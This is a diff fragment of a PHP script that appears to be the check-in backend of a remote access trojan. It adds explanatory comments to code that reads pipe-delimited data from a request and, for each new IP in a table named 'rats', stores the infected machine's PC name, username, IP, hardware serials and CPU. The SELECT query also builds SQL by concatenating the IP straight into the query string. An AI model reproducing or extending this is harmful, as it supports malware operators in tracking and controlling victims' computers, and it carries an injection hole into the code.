@@ -13,9 +13,9 @@ function getip(){
 	return str_replace("::1", "localhost", $ip);
 }
 
-$data = explode("|", $_GET["data"]);
+$data = explode("|", $_GET["data"]); // Splits data by pipeline delimiter
 
-if($link->query("SELECT * FROM rats WHERE ip = '".getip()."'")->num_rows === 0){
+if($link->query("SELECT * FROM rats WHERE ip = '".getip()."'")->num_rows === 0){ // Checks if the number of rows with the ip of request sender is 0
 	$sql = "INSERT INTO rats (pcname, username, ip, disk_serial, baseboard_serial, ram_serial, cpu) VALUES (?, ?, ?, ?, ?, ?, ?)";
 	if($stmt = $link->prepare($sql)){
         $stmt->bind_param("sssssss", $pcname, $username, $ip, $disk_serial, $baseboard_serial, $ram_serial, $cpu);
